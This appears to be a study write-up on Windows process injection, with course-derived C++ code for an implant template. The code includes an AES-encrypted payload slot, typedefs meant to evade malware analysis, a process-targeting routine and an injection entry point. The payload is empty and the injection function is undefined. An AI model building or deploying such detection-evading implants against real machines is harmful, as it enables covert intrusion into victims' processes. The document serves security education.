# Wumbobfuscating Process Injection Techniques
The C/C++ code exemplifying the process injection techniques below was originally written by [Sektor7 Institute](https://institute.sektor7.net/) within their [Malware Development Essentials](https://institute.sektor7.net/courses/red-team-operator-malware-development-essentials) and [Malware Development Intermediate](https://institute.sektor7.net/courses/rto-maldev-intermediate) courses. The explanations and analysis of the code are entirely my own.

## Background
Process injection describes a collection of attack techniques involving the execution of arbitrary code into a live process. Beyond the execution of arbirtrary code, successful process injection may lead to privilege escalation and/or access to the system/network resources of a hijacked process. A multitude of process injection techniques exist, several of which will be disussed and exemplified here.

Process injection is defined in the MITRE ATT&CK Framework as [T1055](https://attack.mitre.org/techniques/T1055/).

The development process below will begin with a process injection implant template, and continue with several insertable injection techniques.

## Developing Process Injection Techniques

### Process Injection Template
This template utilizes AES encryption to obfuscate an injected payload, however, a payload is not provided. Therefore, the template assumes that the provided payload is AES encrypted.

The implant payload, payload size, and decryption key are stored in separate variables at the start of the program.

```c++
// Credit: reenz0h (@sektor7net), RTO Malware Development Essentials course

#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// Shellcode / Payload
unsigned char payload[] = { };
unsigned char key[] = { };

unsigned int payload_len = sizeof(payload);
```

#### Process Injection Stages
Process injection typically begins when a malicious process is spawned. Afterward, the injection technique itself relies on several successful stages taking place. Each stage can be accomplished via multiple Windows API functions. A brief explanation of the stages and common functions leveraged to execute them is below:

1. [`CreateToolhelp32Snapshot()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot), [`EnumProcesses()`](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses) - A list of running processes is generated.
2. [`OpenProcess()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) - A handle is opened to a target process.
3. [`VirtualAllocEx()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) - An empty buffer of memory is allocated within the a target process.
4. [`WriteProcessMemory()`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) - The payload is written into the allocated memory within the target process.
5. [`CreateRemoteThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread), [`RtlCreateUserThread()`](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html), [`NtCreateThreadEx()`](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html) - The payload written in the allocated memory of the target process is executed.

#### Process Injection Function Typedef
Key process injection functions are highly recognizable both by automated malware analysis engines and individual analysts. In order to best organize and eventually obfuscate these functions, `typedef` can be used to create individual types containing the values of these functions. The precise use case for this will become more clear further into the program.

```c++
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);
```

#### AES Decryption
The AES decryption function takes the AES-encrypted payload, the payload length, the decryption key, and the key length. It then decrypts the payload and destroys the contents of the key and the associated hash data.

```c++
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}
```

#### Process Targeting
In reference to Stages 1-2 above, the generation of a list of running processes and the opening of a handle to a target process is performed by the following `FindTarget()` function. `FindTarget()` takes a name of a function as an argument, and ultimately seeks to return an integer of the target Process ID (PID), which will subsequently be used for injection.

In order to accomplish this, `FindTarget()` instantiates a handle (`hProcSnap`), a `PROCESSENTRY32` size variable (`pe32`), and a Process ID (`pid`). It then defines the handle based on the output of [`CreateToolhelp32Snapshot()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) with the `TH32CS_SNAPPROCESS` argument to include all processes in the system in the snapshot. The `pe32` variable then stores the size of this snapshot for future use.

Iterating through the processes in the snapshot requires use of the [`Process32First()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) and [`Process32Next()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) functions, which both take the `hProcSnap` variable storing the snapshot and the address of the `pe32` variable, which contains the size of the snapshot. `Process32Entry` begins the iteration in an initial `if` statement that checks to ensure that all required variables are present. If they are, a `while` loop is implemented to run the `Process32Next()` iteration and compare the process name argument provided to `FindTarget()` with the current iterated process name (`pe32.szExeFile`). [`lstrcmpiA`](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lstrcmpia) is used to make this comparison. When the comparison is successful, the Process ID (`pid`) stored in (`pe32.th32ProcessID`) is stored in a separate variable and returned, and the handle to the process snapshot is closed.. If not matching process is found, then the function breaks.

```c++
int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}
```

#### Payload Writing & Execution

```c++
int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject2(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
```
